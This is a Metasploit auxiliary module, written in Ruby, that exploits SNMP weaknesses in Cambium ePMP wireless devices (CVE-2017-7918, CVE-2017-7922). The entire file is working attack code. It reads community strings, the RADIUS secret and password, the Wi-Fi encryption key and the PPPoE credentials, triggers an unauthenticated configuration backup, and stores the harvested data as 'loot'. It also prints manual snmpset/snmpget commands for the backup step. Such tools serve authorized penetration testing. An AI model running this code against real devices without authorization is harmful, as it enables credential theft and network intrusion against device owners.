##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Cambium ePMP 1000 SNMP Enumeration',
      'Description' => %{
        Cambium devices (ePMP, PMP, Force, & others) can be administered using
        SNMP. The device configuration contains IP addresses, keys, and passwords,
        amongst other information. This module uses SNMP to extract Cambium ePMP device
        configuration. On certain software versions, specific device configuration
        values can be accessed using SNMP RO string, even though only SNMP RW string
        should be able to access them, according to MIB documentation. The module also
        triggers full configuration backup, and retrieves the backup url. The
        configuration file can then be downloaded without authentication. The module
        has been tested on Cambium ePMP versions 3.5 & prior.
      },
      'References' =>
        [
          ['URL', 'https://ipositivesecurity.com/2017/04/07/cambium-snmp-security-vulnerabilities/'],
          ['CVE', '2017-7918'],
          ['CVE', '2017-7922']
        ],
      'Author' => ['Karn Ganeshen'],
      'License' => MSF_LICENSE
    )
  end

  def run_host(ip)
    begin
      snmp = connect_snmp

      epmp_info = ''

      # System Info
      snmp_systemname = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.3.0')
      snmp_systemdescription = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.4.0')
      system_uptime = snmp.get_value('1.3.6.1.4.1.17713.21.1.1.4.0')
      uboot_version = snmp.get_value('1.3.6.1.4.1.17713.21.1.1.14.0')

      epmp_info << "SNMP System Name: #{snmp_systemname}" << "\n"
      epmp_info << "SNMP System Description: #{snmp_systemdescription}" << "\n"
      epmp_info << "Device UpTime: #{system_uptime}" << "\n"
      epmp_info << "U-boot version: #{uboot_version}" << "\n"

      # SNMP Info
      snmp_readonly_community = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.1.0')
      snmp_readwrite_community = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.2.0')
      snmp_trap_community = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.6.0')
      snmp_trap_entryip = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.7.1.2.0')

      epmp_info << "SNMP read-only community name: #{snmp_readonly_community}" << "\n"
      epmp_info << "SNMP read-write community name: #{snmp_readwrite_community}" << "\n"
      epmp_info << "SNMP Trap Community: #{snmp_trap_community}" << "\n"
      epmp_info << "SNMP Trap Server IP Address: #{snmp_trap_entryip}" << "\n"

      # WIFI Radius Info
      wireless_radius_serverinfo = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.5.5.0')
      wireless_radius_serverport = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.6.1.1.3.0')
      wireless_radius_serversecret = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.6.1.1.4.0')
      wireless_radius_username = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.5.8.0')
      wireless_radius_password = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.5.9.0')

      epmp_info << "RADIUS server info: #{wireless_radius_serverinfo}" << "\n"
      epmp_info << "RADIUS server port: #{wireless_radius_serverport}" << "\n"
      epmp_info << "RADIUS server secret: #{wireless_radius_serversecret}" << "\n"
      epmp_info << "Wireless Radius Username: #{wireless_radius_username}" << "\n"
      epmp_info << "Wireless Radius Password: #{wireless_radius_password}" << "\n"

      # WIFI Info
      wireless_interface_ssid = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.2.2.0')
      wireless_interface_encryptionkey = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.2.4.0')
      wireless_interface_encryption = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.2.3.0')

      epmp_info << "Wireless Interface SSID: #{wireless_interface_ssid}" << "\n"
      epmp_info << "Wireless Interface Encryption Key: #{wireless_interface_encryptionkey}" << "\n"
      epmp_info << "Wireless Interface Encryption (1 - Open mode, 2 - wpa2 mode, 3 - EAP-TTLS): #{wireless_interface_encryption}" << "\n"

      # Network PPPoE config
      network_wan_pppoeservice = snmp.get_value('1.3.6.1.4.1.17713.21.3.4.3.13.0')
      network_wan_pppoeusername = snmp.get_value('1.3.6.1.4.1.17713.21.3.4.3.10.0')
      network_wan_pppoepassword = snmp.get_value('1.3.6.1.4.1.17713.21.3.4.3.11.0')

      epmp_info << "Network PPPoE Service Name: #{network_wan_pppoeservice}" << "\n"
      epmp_info << "Network PPPoE Username: #{network_wan_pppoeusername}" << "\n"
      epmp_info << "Network PPPoE Password: #{network_wan_pppoepassword}" << "\n"

      # Printing captured info
      print_status("Fetching System Information...\n")
      print_good("#{ip}")
      print_good("SNMP System Name: #{snmp_systemname}")
      print_good("SNMP System Description: #{snmp_systemdescription}")
      print_good("Device UpTime: #{system_uptime}")
      print_good("U-boot version: #{uboot_version} \n")

      print_status("Fetching SNMP Information...\n")
      print_good("SNMP read-only community name: #{snmp_readonly_community}")
      print_good("SNMP read-write community name: #{snmp_readwrite_community}")
      print_good("SNMP Trap Community: #{snmp_trap_community}")
      print_good("SNMP Trap Server IP Address: #{snmp_trap_entryip} \n")

      print_status("Fetching WIFI Information...\n")
      print_good("Wireless Interface SSID: #{wireless_interface_ssid}")
      print_good("Wireless Interface Encryption Key: #{wireless_interface_encryptionkey}")
      print_good("Wireless Interface Encryption (1 - Open mode, 2 - wpa2 mode, 3 - EAP-TTLS): #{wireless_interface_encryption} \n")

      print_status("Fetching WIFI Radius Information...\n")
      print_good("RADIUS server info: #{wireless_radius_serverinfo}")
      print_good("RADIUS server port: #{wireless_radius_serverport}")
      print_good("RADIUS server secret: #{wireless_radius_serversecret}")
      print_good("Wireless Radius Username: #{wireless_radius_username}")
      print_good("Wireless Radius Password: #{wireless_radius_password} \n")

      print_status("Fetching Network PPPoE Information...\n")
      print_good("Network PPPoE Service Name: #{network_wan_pppoeservice}")
      print_good("Network PPPoE Username: #{network_wan_pppoeusername}")
      print_good("Network PPPoE Password: #{network_wan_pppoepassword} \n")

      # set request
      backup_oid = '1.3.6.1.4.1.17713.21.6.4.10.0'
      enable_backup = '1'
      varbind = SNMP::VarBind.new(backup_oid, SNMP::OctetString.new(enable_backup))
      snmp.set(varbind)
      backup_location_oid = '1.3.6.1.4.1.17713.21.6.4.13.0'
      backup_location = snmp.get_value(backup_location_oid)

      if @backup_location.present? == false
        print_status('Backup needs to triggered manually. Run the following commands:')
        print_status("   snmpset -c <SNMP-RW-string> -v 1 #{datastore['RHOST']} 1.3.6.1.4.1.17713.21.6.4.10.0 i 1")
        print_status("   snmpget -c <SNMP-RW-string> -v 1 #{datastore['RHOST']} 1.3.6.1.4.1.17713.21.6.4.13.0 \n")
      else
        print_good("Configuration backed-up for direct download at: #{backup_location}")
      end

      # Woot we got loot.
      loot_name     = 'snmp_loot'
      loot_type     = 'text/plain'
      loot_filename = 'epmp1000_snmp_loot.txt'
      loot_desc     = 'Cambium ePMP configuration data'
      p = store_loot(loot_name, loot_type, datastore['RHOST'], epmp_info, loot_filename, loot_desc)
      print_good("Cambium ePMP loot saved at #{p}")

    rescue SNMP::RequestTimeout
      print_error("#{ip} SNMP request timeout.")
    rescue Rex::ConnectionError
      print_error("#{ip} Connection refused.")
    rescue SNMP::InvalidIpAddress
      print_error("#{ip} Invalid IP Address. Check it with 'snmpwalk tool'.")
    rescue SNMP::UnsupportedVersion
      print_error("#{ip} Unsupported SNMP version specified. Select from '1' or '2c'.")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Unknown error: #{e.class} #{e}")
      elog("Unknown error: #{e.class} #{e}")
      elog("Call stack:\n#{e.backtrace.join "\n"}")
    ensure
      disconnect_snmp
    end
  end
end
